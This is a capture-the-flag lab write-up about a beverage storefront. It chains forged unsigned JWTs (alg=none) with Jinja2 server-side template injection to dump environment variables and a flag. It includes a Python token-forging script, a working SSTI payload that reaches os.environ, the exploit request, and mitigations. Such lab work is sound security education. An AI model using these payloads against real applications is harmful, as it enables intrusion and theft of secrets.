---
title: "Server-Side Template Injection via Unsigned JWT Claim | GeoJearyy"
date: 2026-06-11 09:30:00 +0530
categories: [A05 - Injection, Server-Side Template Injection]
tags: [ssti, jinja2, jwt-none, jwt-forgery, flask, webverselabs-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
path: /assets/images/posts/geojearyy-ssti-jwt-none.webp
alt: GeoJearyy Server-Side Template Injection via Unsigned JWT Claim
---

## Lab Link

Lab: [GeoJearyy](https://dashboard.webverselabs-pro.com/mystery-challenges/geojearyy/)

## Overview

GeoJearyy is a beverage storefront where authenticated users can browse flavours, add products to the cart, and view their account dashboard.

During testing, the authentication cookie stood out because the application trusted a JWT named `gj_auth`. By modifying this token and setting the JWT algorithm to `none`, it was possible to control the `username` claim.

The controlled username was then reflected inside the account page greeting. Instead of being rendered as plain text, the value was evaluated by the server-side template engine, leading to Server-Side Template Injection.

## Objective

Gain code execution or sensitive data disclosure through the application and retrieve the challenge flag.

## Vulnerability Identification

```text
OWASP Top 10:2025
└── A05 - Injection
    └── Server-Side Template Injection
        └── User-controlled JWT claim rendered inside server-side template
            └── Jinja2 object traversal used to access os.environ
```

A secondary weakness also helped exploitation:

```text
Authentication Weakness
└── JWT accepts alg=none
    └── Attacker can forge unsigned token claims
        └── username claim becomes attacker-controlled input
```

## Reconnaissance

After logging in, the application issued two cookies:

```http
Cookie: session=<flask-session>; gj_auth=<jwt>
```

The normal account page used the JWT identity to display a greeting:

```html
Welcome back, kelvin!
```

This suggested that the value inside the JWT was being used directly in the account template.

The important cookie was:

```text
gj_auth=<JWT_TOKEN>
```

Decoding the JWT showed user-controlled profile data such as:

```json
{
  "username": "kelvin",
  "email": "kelvin@kel.com",
  "iat": 1781169989,
  "exp": 1781173589
}
```

## Testing JWT Trust

The JWT header was modified to use the `none` algorithm:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Because the application accepted the unsigned token, the payload could be modified without knowing any signing secret.

A forged token structure looked like this:

```text
base64url(header).base64url(payload).
```

Notice the trailing dot. That represents an empty signature.

## SSTI Payload

To test whether the username was being evaluated by the server-side template engine, the `username` claim was replaced with a Jinja2 expression.

Initial test payload:

```jinja2
{{7*7}}
```

If the account page returned:

```text
Welcome back, 49!
```

that confirmed Server-Side Template Injection.

After confirming template evaluation, the payload was upgraded to read environment variables:

```jinja2
{{self.__init__.__globals__.__builtins__.__import__('os').environ}}
```

The forged JWT payload became:

```json
{
  "username": "{{self.__init__.__globals__.__builtins__.__import__('os').environ}}",
  "email": "kelvin@kel.com",
  "iat": 1781169989,
  "exp": 1781173589
}
```

## Forging the Token

A simple Python helper can generate the unsigned JWT:

```python
import base64
import json
import time

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "username": "{{self.__init__.__globals__.__builtins__.__import__('os').environ}}",
    "email": "kelvin@kel.com",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = (
    b64url(json.dumps(header, separators=(",", ":")).encode())
    + "."
    + b64url(json.dumps(payload, separators=(",", ":")).encode())
    + "."
)

print(token)
```

This produced a token in the following format:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.
```

## Exploitation Request

The forged token was then placed inside the `gj_auth` cookie and the account page was requested:

```http
GET /account HTTP/2
Host: target
Cookie: session=<valid_session_cookie>; gj_auth=<forged_unsigned_jwt>
User-Agent: Mozilla/5.0
Accept: text/html
```

## Proof of Exploitation

The server rendered the injected template expression inside the account greeting:

```html
<h1 class="display greet">
  Welcome back, environ({
    'PYTHON_VERSION': '3.11.15',
    'PWD': '/app',
    'HOME': '/home/geojearyy',
    'SERVER_SOFTWARE': 'gunicorn/22.0.0',
    'FLAG': 'WEBVERSE{REDACTED}'
  })!
</h1>
```

The presence of `os.environ` output confirmed that the template payload was executed server-side.

The flag was stored in an environment variable:

```text
FLAG=WEBVERSE{REDACTED}
```

## Root Cause Analysis

The issue was caused by two insecure implementation choices.

First, the application accepted JWTs using the `none` algorithm. This allowed an attacker to forge arbitrary claims without a valid signature.

Second, the `username` claim from the JWT was passed into a server-side template in an unsafe way. Instead of being treated as plain text, the value was evaluated by the template engine.

The vulnerable flow looked like this:

```text
Attacker-controlled JWT
        ↓
Modified username claim
        ↓
Account page greeting
        ↓
Server-side template evaluation
        ↓
Environment variable disclosure
```

## Impact

An attacker could use this vulnerability to:

* Forge authenticated identity data.
* Inject server-side template expressions.
* Access sensitive application internals.
* Read environment variables.
* Expose secrets, credentials, or challenge flags.
* Potentially escalate to remote code execution depending on template sandboxing and runtime permissions.

In this lab, the impact was confirmed by reading the `FLAG` environment variable.

## Mitigation

To fix this issue:

* Never accept JWTs signed with `alg=none`.
* Enforce a strict allowlist of signing algorithms such as `HS256` or `RS256`.
* Always verify JWT signatures server-side.
* Do not trust identity claims directly from client-side cookies.
* Treat template variables as data, not template source.
* Never dynamically render user-controlled values with functions such as `render_template_string`.
* Store sensitive secrets outside the web process environment where possible.
* Add regression tests for JWT algorithm confusion and SSTI payloads.

A safer JWT verification approach should explicitly define the expected algorithm:

```python
jwt.decode(
    token,
    key=JWT_SECRET,
    algorithms=["HS256"]
)
```

A safer template rendering approach should pass user data as escaped variables:

```python
return render_template("account.html", username=username)
```

and avoid rendering user-controlled strings as template source.

## Real-World Insight

This challenge is a good example of how two medium-severity mistakes can combine into a critical vulnerability.

Accepting unsigned JWTs gave control over trusted identity data. Rendering that trusted identity data unsafely inside a server-side template turned claim manipulation into server-side code execution behavior.

Authentication data should never be treated as inherently safe just because it comes from a cookie or token. If the client can store it, the client can tamper with it unless the server verifies it correctly.
